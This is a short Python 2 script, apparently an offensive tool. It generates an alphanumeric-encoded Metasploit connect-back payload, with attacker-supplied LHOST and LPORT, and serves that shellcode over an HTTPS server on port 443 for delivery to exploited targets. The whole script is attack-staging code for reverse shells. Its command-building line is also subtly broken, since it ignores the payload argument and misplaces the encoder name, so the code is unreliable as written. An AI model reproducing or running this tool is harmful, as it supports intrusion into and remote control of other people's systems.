#!/usr/bin/env python
# Tom Steele tom@huptwo34.com
# generates a alphanum payload and hosts over https server
# you'll need a .pem
import argparse
import ssl
import sys
from subprocess import *
from multiprocessing import Process
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer


class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(shellcode)


def https_server(args):
    port = 443
    httpd = HTTPServer((args.lhost, port), Handler)
    httpd.socket = ssl.wrap_socket(httpd.socket,
                                   certfile=args.cert, server_side=True)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        sys.exit(1)


def create_shellcode(args):
    global shellcode
    msfpayload = args.msfroot + "msfpayload"
    msfencode = args.msfroot + "msfencode"
    msfgen = "{0} {1} EXITFUNC=thread LPORT={2}".format(msfpayload, msfencode, args.lport)
    msfgen += " LHOST={0} R | {1} -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX".format(msfencode, args.lhost)
    shellcode = Popen(msfgen, stdout=PIPE, shell=True).stdout.read()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--cert', required=True, help='pem location')
    parser.add_argument('--payload', required=True, help='msf payload')
    parser.add_argument('--lhost', required=True, help='connectback IP')
    parser.add_argument('--lport', required=True, help='connectback Port')
    parser.add_argument('--msfroot', required=True, help='msf root dir')
    args = parser.parse_args()
    print "Creating Shellcode"
    create_shellcode(args)
    p = Process(target=https_server, args=(args,))
    p.start()
    print "HTTPS Server Listening"


if __name__ == '__main__':
    main()
